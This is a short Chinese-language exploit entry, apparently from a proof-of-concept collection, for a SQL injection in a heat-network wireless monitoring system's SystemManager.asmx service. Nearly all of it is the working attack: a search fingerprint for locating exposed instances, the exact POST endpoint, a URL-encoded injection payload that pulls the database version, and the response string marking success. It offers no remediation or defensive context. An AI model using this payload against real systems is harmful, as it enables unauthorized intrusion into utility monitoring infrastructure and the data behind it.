# 热网无线监测系统SystemManager.asmxSQL注入漏洞

热网无线监测系统SystemManager.asmx ｜ SQL注入 ｜ —
- **指纹**：`body="Downloads/HDPrintInstall.rar"`
- **请求**：`POST /DataSrvs/SystemManager.asmx/UpdateWUT HTTP/1.1`

**Payload**
```
id=%28SELECT+CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28CASE+WHEN+%281675%3D1675%29+THEN+@@version+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29&name=&desc=
```
- **响应特征**：200 System.Data.SqlCilent